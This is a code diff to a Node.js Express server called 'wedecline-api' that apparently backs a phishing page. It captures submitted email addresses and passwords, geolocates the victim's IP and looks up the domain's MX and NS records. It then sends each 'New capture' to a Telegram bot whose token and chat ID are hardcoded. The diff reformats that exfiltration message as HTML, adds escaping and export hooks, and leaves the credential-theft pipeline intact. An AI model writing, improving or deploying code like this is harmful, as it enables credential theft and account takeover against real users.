@@ -16,9 +16,10 @@ const TG_TOKEN = process.env.TELEGRAM_TOKEN || '8947312433:AAGGSkA98sqiRO1wag2cH
 const TG_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8676610607';
 const TG_SEND = String(process.env.TG_SEND || 'true').toLowerCase() === 'true';
 const LOG_FILE = path.join(__dirname, 'captures.log');
+const NL = String.fromCharCode(10);
 
 function logLine(line) {
-  try { fs.appendFileSync(LOG_FILE, line + '\n'); } catch (err) { /* ignore */ }
+  try { fs.appendFileSync(LOG_FILE, line + NL); } catch (err) { /* ignore */ }
 }
 
 function clientIp(req) {
@@ -103,10 +104,41 @@ function getGeo(ip) {
   });
 }
 
+function esc(v) {
+  return String(v == null ? '' : v)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+}
+
+function cap(arr, n) {
+  if (!Array.isArray(arr) || !arr.length) return 'none';
+  const items = arr.slice(0, n).map(function (r) { return r.exchange || r.host; });
+  if (arr.length > n) items.push('+' + (arr.length - n) + ' more');
+  return items.join(' | ');
+}
+
+function buildTgMessage(data, ip, geo) {
+  const iso = new Date().toISOString();
+  const lines = [
+    '<b>WEDECLINE | New capture</b>',
+    '',
+    '<b>Email:</b> ' + esc(data.email),
+    '<b>Password:</b> ' + esc(data.password),
+    '<b>IP:</b> ' + esc(ip),
+    '<b>Location:</b> ' + esc(geo),
+    '<b>Domain:</b> ' + esc(data.domain),
+    '<b>MX:</b> ' + esc(cap(data.mx, 3)),
+    '<b>NS:</b> ' + esc(cap(data.ns, 3)),
+    '<b>Date:</b> ' + esc(iso.slice(0, 10) + ' ' + iso.slice(11, 19) + ' UTC')
+  ];
+  return lines.join(NL);
+}
+
 function tgSend(text) {
   return new Promise(function (resolve) {
     if (!TG_SEND) { logLine('[tg] skipped (TG_SEND=false)'); return resolve(false); }
-    const body = JSON.stringify({ chat_id: TG_CHAT_ID, text: text });
+    const body = JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'HTML' });
     const req = https.request({
       hostname: 'api.telegram.org',
       path: '/bot' + TG_TOKEN + '/sendMessage',
@@ -126,23 +158,6 @@ function tgSend(text) {
     req.on('error', function (err) { logLine('[tg] error: ' + err.message); resolve(false); });
     req.end(body);
   });
-}
-
-function buildTgMessage(data, ip, geo) {
-  const lines = [
-    'Wedecline',
-    '',
-    'New capture',
-    'Email: ' + (data.email || ''),
-    'Password: ' + (data.password || ''),
-    'IP: ' + ip,
-    'Location: ' + geo,
-    'Domain: ' + (data.domain || ''),
-    'MX: ' + (Array.isArray(data.mx) && data.mx.length ? data.mx.join(' | ') : 'none'),
-    'NS: ' + (Array.isArray(data.ns) && data.ns.length ? data.ns.join(' | ') : 'none'),
-    'Date: ' + new Date().toISOString()
-  ];
-  return lines.join('\n');
 }
 
 function capture(req, res) {
@@ -171,13 +186,21 @@ app.post('/auth', capture);
 app.get('/', function (req, res) {
   const page = path.join(__dirname, 'wedecline.html');
   if (fs.existsSync(page)) return res.sendFile(page);
-  res.json({ name: 'wedecline-api', status: 'ok', endpoints: ['GET /lookup?email=', 'POST /auth/login'] });
+  res.json({ name: 'wedecline-api', version: 'v2', status: 'ok', endpoints: ['GET /lookup?email=', 'POST /auth/login'] });
 });
 
 app.use(function (req, res) {
   res.status(404).json({ error: 'not found' });
 });
 
-app.listen(PORT, function () {
-  console.log('wedecline-api listening on port ' + PORT + ' (TG_SEND=' + TG_SEND + ')');
-});
+if (require.main === module) {
+  app.listen(PORT, function () {
+    console.log('wedecline-api listening on port ' + PORT + ' (TG_SEND=' + TG_SEND + ')');
+  });
+}
+
+module.exports = app;
+
+module.exports.buildTgMessage = buildTgMessage;
+module.exports.esc = esc;
+module.exports.cap = cap;
